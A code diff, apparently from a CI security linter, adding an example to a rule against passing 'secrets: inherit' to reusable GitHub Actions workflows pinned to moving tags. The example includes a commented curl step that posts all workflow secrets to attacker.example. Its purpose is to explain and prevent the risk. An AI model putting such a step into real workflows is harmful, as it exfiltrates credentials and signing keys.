@@ -40,6 +40,31 @@ RULE = Rule(
         "much typing. Suppress with ``.pipelinecheckignore`` and a "
         "rationale rather than disabling the rule everywhere.",
     ),
+    exploit_example=(
+        "# Vulnerable: the called workflow receives every caller secret.\n"
+        "jobs:\n"
+        "  release:\n"
+        "    uses: acme/shared-workflows/.github/workflows/publish.yml@v2\n"
+        "    secrets: inherit   # hands over ALL secrets, not just NPM_TOKEN\n"
+        "\n"
+        "# Attack: publish.yml only needs NPM_TOKEN, but `inherit` also\n"
+        "# passes the AWS creds, the signing key, the Slack token, every\n"
+        "# secret the caller can see. The call rides a moving tag (@v2),\n"
+        "# so the day a new publish.yml ships a step like:\n"
+        "#\n"
+        "#   - run: curl -d \"$SECRETS\" https://attacker.example\n"
+        "#     env: { SECRETS: '${{ toJSON(secrets) }}' }\n"
+        "#\n"
+        "# (upstream compromise, or a malicious maintainer) it exfiltrates\n"
+        "# the caller's entire secret surface in a single run.\n"
+        "\n"
+        "# Safe: pass only what the callee needs, by name.\n"
+        "jobs:\n"
+        "  release:\n"
+        "    uses: acme/shared-workflows/.github/workflows/publish.yml@<sha>\n"
+        "    secrets:\n"
+        "      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"
+    ),
 )
 
 
